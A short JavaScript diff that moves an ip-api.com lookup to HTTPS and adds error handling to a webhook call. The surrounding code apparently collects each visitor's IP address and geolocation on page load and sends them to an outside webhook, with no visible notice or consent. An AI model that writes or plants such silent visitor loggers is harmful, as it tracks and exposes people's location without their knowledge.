@@ -18,8 +18,8 @@ const visitTime = formatDateTime(new Date());
 // Function to get the user's IP and geolocation using ip-api
 async function getIPAndGeolocation() {
   try {
-    // Get IP address and geolocation information from ip-api
-    const response = await fetch('http://ip-api.com/json');
+    // Use HTTPS to avoid mixed content issues
+    const response = await fetch('https://ip-api.com/json');
     const data = await response.json();
 
     const ip = data.query;
@@ -54,6 +54,7 @@ Geolocation: ${geolocation}\`\`\``  // Ensure content is not empty
     })
   })
   .then(response => response.json())
+  .catch(error => console.error('Error sending data to webhook:', error));
 }
 
 // Call function to send data when page loads
